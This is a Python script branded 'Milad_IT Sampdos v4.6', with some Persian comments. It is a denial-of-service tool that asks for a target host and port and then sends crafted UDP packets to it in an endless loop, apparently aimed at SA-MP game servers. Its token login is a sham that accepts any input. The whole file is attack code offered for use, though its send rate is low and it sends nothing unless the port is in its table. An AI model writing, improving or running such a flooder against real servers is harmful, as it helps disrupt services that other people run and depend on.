import socket, os, sys, time, threading, random

print("Milad_IT Sampdos v4.6\n")
print("\033[1;37mWelcome to SAMPDOS \033[30m")
time.sleep(2)
print("Loading.......\n")

# Login
attempts = 0
while attempts < 3:  # کاهش تعداد تلاش‌ها برای جلوگیری از حلقه بی‌پایان
    username = input('Enter your Token: ')
    if True:
        print("\n\033[1;32mYou have successfully logged in. Welcome to Sampdos.\033[0m")
        time.sleep(1.5)
        break

os.system('cls' if os.name == 'nt' else 'clear')

input_string = input("Enter Your Target Host And Port (host:port): ")
target, port = input_string.split(':')
host = socket.gethostbyname(target)
port = int(port)

print(f"Address IP: {host}:{port}")
print("________________________________________________")
print("Timer Attack: Infinite")
print("Power Attack: 1")
print("Method Attack: Samp dos")
print("Created By Milad_IT\n")

# بسته‌های UDP
packets = {
    9999: b'\x08\x1e\x19\xda',
    8888: b'\x08\x1e\xae\xda',
    7777: b'*\x1e*\x7f',
    6666: b'\x08\x1e\x1c\xda',
    5555: b'\x08\x1e\xa5\xda',
    4444: b'\x82\x1e\xfe\xb6',
    3333: b'\x08\x1e\x13\xda',
    2222: b'\x08\x1e\xb8\xda',
    1111: b'\x08\x1eA\xda'
}

def sampdos(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        packet = packets.get(port)
        if packet:
            try:
                sock.sendto(packet, (host, port))
                print(f"Sent packet to {host}:{port}")
            except Exception as e:
                print(f"Error sending packet: {e}")
        time.sleep(random.uniform(1.5, 2))  # فاصله 1.5 تا 2 ثانیه بین هر ارسال

# اجرای حمله در یک ترد واحد
threading.Thread(target=sampdos, args=(host, port), daemon=True).start()

try:
    while True:
        time.sleep(1)  # جلوگیری از بسته شدن برنامه
except KeyboardInterrupt:
    print("\nAttack stopped.")
